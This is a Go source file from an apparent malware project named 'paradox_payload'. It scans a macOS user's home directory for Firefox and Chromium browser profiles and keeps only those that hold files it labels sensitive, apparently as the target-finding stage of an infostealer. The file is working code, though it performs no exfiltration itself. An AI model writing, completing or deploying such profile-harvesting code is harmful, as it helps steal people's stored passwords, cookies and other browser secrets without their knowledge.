package discovery

import (
	"fmt"
	"os"
	"path/filepath"

	"paradox_payload/static"
)

type FoundBrowserProfile struct {
	Path        string
	Type        string
	BrowserName string
}

func CheckBrowserDirectories(homeDir string) ([]FoundBrowserProfile, error) {
	foundProfiles := []FoundBrowserProfile{}
	appSupportDir := filepath.Join(homeDir, "Library", "Application Support")

	for browserName, data := range static.BrowserDefinitions {
		var baseDir string
		switch data.BaseDir {
		case "AppSupport":
			baseDir = appSupportDir
		case "Home":
			baseDir = homeDir
		default:
			baseDir = appSupportDir
		}

		for _, relPath := range data.Paths {
			path := filepath.Join(baseDir, relPath)

			switch data.Type {
			case "Gecko":
				if filepath.Base(path) == "Profiles" {
					entries, err := os.ReadDir(path)
					if err == nil {
						for _, entry := range entries {
							if entry.IsDir() {
								profilePath := filepath.Join(path, entry.Name())
								foundSensitiveFile := false
								for _, file := range static.FirefoxProfileFiles {
									if _, err := os.Stat(filepath.Join(profilePath, file)); err == nil {
										foundSensitiveFile = true
										break
									}
								}
								if foundSensitiveFile {
									foundProfiles = append(foundProfiles, FoundBrowserProfile{Path: profilePath, Type: data.Type, BrowserName: browserName})
								}
							}
						}
					} else if !os.IsNotExist(err) {
						fmt.Printf("Error reading Firefox profiles directory %s: %v\n", path, err)
					}
				}
			case "Chromium":
				if info, err := os.Stat(path); err == nil && info.IsDir() {
					entries, err := os.ReadDir(path)
					if err == nil {
						for _, entry := range entries {
							if entry.IsDir() && (entry.Name() == "Default" || (len(entry.Name()) > 7 && entry.Name()[:7] == "Profile")) {
								profilePath := filepath.Join(path, entry.Name())
								foundSensitiveFile := false
								for _, file := range static.ChromiumProfileFiles {
									if _, err := os.Stat(filepath.Join(profilePath, file)); err == nil {
										foundSensitiveFile = true
										break
									}
								}
								if foundSensitiveFile {
									foundProfiles = append(foundProfiles, FoundBrowserProfile{Path: profilePath, Type: data.Type, BrowserName: browserName})
								}
							}
						}
					} else if !os.IsNotExist(err) {
						fmt.Printf("Error reading Chromium directory %s: %v\n", path, err)
					}
				} else if !os.IsNotExist(err) {
					fmt.Printf("Error checking Chromium directory %s: %v\n", path, err)
				}
			}
		}
	}
	return foundProfiles, nil
}
